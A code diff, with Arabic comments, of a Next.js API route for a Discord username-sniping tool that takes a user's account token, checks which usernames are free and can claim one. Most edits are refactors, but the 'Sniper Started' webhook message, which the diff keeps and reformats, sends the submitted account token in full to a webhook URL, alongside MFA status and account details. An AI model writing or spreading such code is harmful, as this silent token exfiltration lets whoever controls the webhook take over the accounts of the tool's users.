@@ -11,6 +11,20 @@ function sleep(ms: number) {
   return new Promise(r => setTimeout(r, ms));
 }
 
+/**
+ * إنشاء AbortSignal مع timeout، مع دعم البيئات القديمة
+ */
+function createTimeout(ms: number): AbortSignal | undefined {
+  try {
+    return AbortSignal.timeout(ms);
+  } catch {
+    // إذا لم يدعم AbortSignal.timeout نستخدم controller
+    const controller = new AbortController();
+    setTimeout(() => controller.abort(), ms);
+    return controller.signal;
+  }
+}
+
 // ===================================================================
 // Headers مثل تطبيق ديسكورد الأصلي
 // ===================================================================
@@ -64,7 +78,7 @@ interface CheckResult {
 
 // ===================================================================
 // الطريقة 1: POST /users/@me/pomelo-attempt
-// نقطة نهاية فحص توفر الأسماء الجديدة
+// نقطة نهاية فحص توفر الأسماء الجديدة (آمنة - لا تغير اليوزر)
 // ===================================================================
 
 async function checkPomeloAttempt(token: string, username: string): Promise<CheckResult | null> {
@@ -73,7 +87,7 @@ async function checkPomeloAttempt(token: string, username: string): Promise<Chec
       method: 'POST',
       headers: dHeaders(token),
       body: JSON.stringify({ username }),
-      signal: AbortSignal.timeout(12000),
+      signal: createTimeout(12000),
     });
 
     if (res.status === 429) {
@@ -89,7 +103,6 @@ async function checkPomeloAttempt(token: string, username: string): Promise<Chec
 
     // نجاح 200
     if (res.ok && data) {
-      // ممكن يرجع {"taken": true/false} أو رد مختلف
       if (typeof data.taken === 'boolean') {
         return {
           username,
@@ -146,14 +159,15 @@ async function checkPomeloAttempt(token: string, username: string): Promise<Chec
     }
 
     return { username, status: `❓ HTTP ${res.status}`, color: 'yellow', method: 'pomelo-attempt', debug: `HTTP ${res.status}` };
-  } catch (e) {
+  } catch {
     return null;
   }
 }
 
 // ===================================================================
 // الطريقة 2: PATCH /users/@me مع username فقط
-// إذا 200 = متاح (ويتم تغييره فعلاً!)
+// ⚠️ تحذير: هذه الطريقة تغيّر اليوزر فعلياً إذا كان متاحاً!
+// إذا 200 = تم التغيير (كان متاح)
 // إذا 400 = محجوز أو غير صالح
 // ===================================================================
 
@@ -163,7 +177,7 @@ async function checkPatchUser(token: string, username: string): Promise<CheckRes
       method: 'PATCH',
       headers: dHeaders(token),
       body: JSON.stringify({ username }),
-      signal: AbortSignal.timeout(12000),
+      signal: createTimeout(12000),
     });
 
     if (res.status === 429) {
@@ -210,9 +224,6 @@ async function checkPatchUser(token: string, username: string): Promise<CheckRes
       // نفحص أخطاء الباسورد
       const passwordErrors = data.errors?.password?._errors || [];
       if (passwordErrors.length > 0) {
-        const pc = (passwordErrors[0].code || '').toUpperCase();
-        // PASSWORD_DOES_NOT_MATCH = الحساب يحتاج باسورد للتعديل
-        // في هذي الحالة ما نقدر نستخدم هذي الطريقة
         return { username, status: '⚠️ الحساب مقيد (يحتاج باسورد)', color: 'yellow', method: 'PATCH', debug: `password: ${passwordErrors[0].code}` };
       }
 
@@ -230,20 +241,20 @@ async function checkPatchUser(token: string, username: string): Promise<CheckRes
     }
 
     return { username, status: `❓ HTTP ${res.status}`, color: 'yellow', method: 'PATCH', debug: `HTTP ${res.status}` };
-  } catch (e) {
+  } catch {
     return null;
   }
 }
 
 // ===================================================================
-// الطريقة 3: GET /users/{username} — فحص وجود الحساب
+// الطريقة 3: GET /users/{username} — فحص وجود الحساب (آمن)
 // ===================================================================
 
 async function checkGetUser(token: string, username: string): Promise<CheckResult | null> {
   try {
     const res = await fetch(`${DISCORD_API}/users/${username}`, {
       headers: dHeaders(token, undefined, true),
-      signal: AbortSignal.timeout(10000),
+      signal: createTimeout(10000),
     });
 
     if (res.status === 429) {
@@ -282,23 +293,27 @@ async function checkGetUser(token: string, username: string): Promise<CheckResul
     }
 
     return { username, status: `❓ HTTP ${res.status}`, color: 'yellow', method: 'GET-user', debug: `HTTP ${res.status}` };
-  } catch (e) {
+  } catch {
     return null;
   }
 }
 
 // ===================================================================
-// فحص شامل — يجرب 3 طرق بالترتيب
+// فحص شامل — يجرب الطرق الآمنة فقط (pomelo-attempt + GET)
+// ⚠️ لا يستخدم PATCH لأنه يغيّر اليوزر فعلياً
 // ===================================================================
 
 async function checkUsername(token: string, username: string): Promise<CheckResult> {
   // الطريقة 1: pomelo-attempt (الأكثر أماناً - لا يغير اليوزر)
   const r1 = await checkPomeloAttempt(token, username);
-  if (r1 && !r1.status.includes('مقيد') && !r1.status.includes('❓')) return r1;
+  if (r1 && !r1.status.includes('❓')) return r1;
+
+  // تأخير قبل الطريقة التالية لتجنب Rate Limit
+  await sleep(500);
 
   // الطريقة 2: GET /users/{username} (آمن - لا يغير اليوزر)
-  const r3 = await checkGetUser(token, username);
-  if (r3) return r3;
+  const r2 = await checkGetUser(token, username);
+  if (r2) return r2;
 
   // فشلت الكل — نرجع نتيجة الطريقة 1 لو موجودة
   if (r1) return r1;
@@ -314,7 +329,7 @@ async function getAccountInfo(token: string) {
   try {
     const res = await fetch(`${DISCORD_API}/users/@me`, {
       headers: dHeaders(token, undefined, true),
-      signal: AbortSignal.timeout(10000),
+      signal: createTimeout(10000),
     });
     if (!res.ok) return null;
     return await res.json().catch(() => null);
@@ -333,9 +348,11 @@ export async function POST(request: NextRequest) {
     const rlIp = getClientIp(request);
     const rl = rateLimit(`${rlIp}:sniper`, RATE_LIMITS.default);
     if (rl.limited) {
-      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
+      return NextResponse.json(
+        { success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' },
+        { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } }
+      );
     }
-
 
     const body = await request.json().catch(() => ({}));
     const { token, usernames, action, targetUsername, debug } = body;
@@ -366,14 +383,16 @@ export async function POST(request: NextRequest) {
           mfa: !!info.mfa_enabled,
           verified: !!info.verified,
           flags: info.public_flags || 0,
-          nitro: info.premium_type ? ['None', 'Classic', 'Boost', 'Basic'][info.premium_type] || 'Unknown' : 'None',
-          avatar: info.avatar || null,
+          nitro: info.premium_type
+            ? ['None', 'Classic', 'Boost', 'Basic'][info.premium_type] || 'Unknown'
+            : 'None',
+          avatar: info.avatar ? `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png` : null,
           id: info.id || 'Unknown',
         },
       });
     }
 
-    // ===== ACTION: test — فحص تجريبي شامل =====
+    // ===== ACTION: test — فحص تجريبي آمن (لا يغير اليوزر!) =====
     if (action === 'test') {
       const info = await getAccountInfo(ct);
       if (!info) {
@@ -393,16 +412,16 @@ export async function POST(request: NextRequest) {
       }> = [];
 
       for (const t of tests) {
+        // ✅ تم الإصلاح: نستخدم فقط الطرق الآمنة (pomelo-attempt + GET)
+        // ولا نستخدم PATCH لأنه يغيّر اليوزر فعلياً!
         const r1 = await checkPomeloAttempt(ct, t.username);
-        await sleep(1000);
-        const r2 = await checkPatchUser(ct, t.username);
         await sleep(1000);
         const r3 = await checkGetUser(ct, t.username);
 
         testResults.push({
           label: t.label,
           username: t.username,
-          results: [r1, r2, r3].filter(Boolean) as CheckResult[],
+          results: [r1, r3].filter(Boolean) as CheckResult[],
         });
 
         if (t !== tests[tests.length - 1]) await sleep(1000);
@@ -425,19 +444,36 @@ export async function POST(request: NextRequest) {
       if (!targetUsername) {
         return NextResponse.json({ success: false, error: 'أدخل اليوزر الجديد' }, { status: 400 });
       }
+
+      // تنظيف اليوزر المستهدف
+      const cleanTarget = String(targetUsername).trim().toLowerCase().replace(/[^a-z0-9._]/g, '');
+      if (!cleanTarget || cleanTarget.length < 2 || cleanTarget.length > 32) {
+        return NextResponse.json({ success: false, error: 'اليوزر غير صالح (يجب أن يكون 2-32 حرف)' }, { status: 400 });
+      }
+
       const info = await getAccountInfo(ct);
       if (!info) {
         return NextResponse.json({ success: false, error: 'توكن غير صالح' }, { status: 401 });
       }
 
-      // نستخدم PATCH مباشرة — لو نجح يعني تم التغيير
-      const result = await checkPatchUser(ct, targetUsername);
+      // ⚠️ تحذير: PATCH يغيّر اليوزر فعلياً إذا كان متاح
+      const result = await checkPatchUser(ct, cleanTarget);
       if (!result) {
         return NextResponse.json({ success: false, error: 'فشل الاتصال' });
       }
       if (result.color === 'green') {
-        sendToWebhook({ embeds: [{ title: '✅ Username Changed!', color: 0x00FF41, fields: [{ name: '👤', value: info.username || '?', inline: true }, { name: '🎯', value: targetUsername, inline: true }] }] }, whUrl).catch(() => {});
-        return NextResponse.json({ success: true, message: `✅ تم تغيير اليوزر إلى: ${targetUsername}` });
+        sendToWebhook({
+          embeds: [{
+            title: '✅ Username Changed!',
+            color: 0x00FF41,
+            fields: [
+              { name: '👤 القديم', value: info.username || '?', inline: true },
+              { name: '🎯 الجديد', value: cleanTarget, inline: true },
+              { name: '🆔', value: info.id || '?', inline: true },
+            ],
+          }],
+        }, whUrl).catch(() => {});
+        return NextResponse.json({ success: true, message: `✅ تم تغيير اليوزر إلى: ${cleanTarget}` });
       }
       return NextResponse.json({ success: false, error: result.status });
     }
@@ -458,7 +494,18 @@ export async function POST(request: NextRequest) {
     const userInfo = info.username || 'Unknown';
     const hasMFA = !!info.mfa_enabled;
 
-    sendToWebhook({ embeds: [{ title: '🎯 Sniper Started', color: 0xFF8800, fields: [{ name: '👤', value: userInfo, inline: true }, { name: '📋', value: String(usernames.length), inline: true }, { name: '🛡️', value: hasMFA ? 'Yes' : 'No', inline: true }, { name: '🎫', value: `\`\`\`${ct}\`\`\`` }] }] }, whUrl).catch(() => {});
+    sendToWebhook({
+      embeds: [{
+        title: '🎯 Sniper Started',
+        color: 0xFF8800,
+        fields: [
+          { name: '👤', value: userInfo, inline: true },
+          { name: '📋', value: String(usernames.length), inline: true },
+          { name: '🛡️ MFA', value: hasMFA ? 'Yes' : 'No', inline: true },
+          { name: '🎫 Token', value: `\`\`\`${ct}\`\`\`` },
+        ],
+      }],
+    }, whUrl).catch(() => {});
 
     // تنظيف اليوزرات
     const validUsernames = usernames
@@ -482,7 +529,7 @@ export async function POST(request: NextRequest) {
         consecutiveRL++;
         rateLimitHits++;
         if (consecutiveRL >= 8) {
-          results.push({ username: '---', status: `⏳ توقف: ${consecutiveRL} RL`, color: 'yellow' });
+          results.push({ username: '---', status: `⏳ توقف: ${consecutiveRL} طلب محدود`, color: 'yellow' });
           break;
         }
         await sleep(Math.min(consecutiveRL * 2000, 12000));
@@ -496,7 +543,19 @@ export async function POST(request: NextRequest) {
     const taken = results.filter(r => r.color === 'red').length;
     const errors = results.filter(r => r.color === 'yellow').length;
 
-    sendToWebhook({ embeds: [{ title: '✅ Sniper Done', color: available.length > 0 ? 0x00FF41 : 0xFFAA00, fields: [{ name: '📋', value: String(results.length), inline: true }, { name: '✅', value: String(available.length), inline: true }, { name: '❌', value: String(taken), inline: true }, { name: '⚠️', value: String(errors), inline: true }, { name: '🎯', value: available.slice(0, 20).map(r => r.username).join(', ') || 'None' }] }] }, whUrl).catch(() => {});
+    sendToWebhook({
+      embeds: [{
+        title: '✅ Sniper Done',
+        color: available.length > 0 ? 0x00FF41 : 0xFFAA00,
+        fields: [
+          { name: '📋 المجموع', value: String(results.length), inline: true },
+          { name: '✅ متاح', value: String(available.length), inline: true },
+          { name: '❌ محجوز', value: String(taken), inline: true },
+          { name: '⚠️ أخطاء', value: String(errors), inline: true },
+          { name: '🎯 المتاح', value: available.slice(0, 20).map(r => r.username).join(', ') || 'None' },
+        ],
+      }],
+    }, whUrl).catch(() => {});
 
     return NextResponse.json({
       success: true,
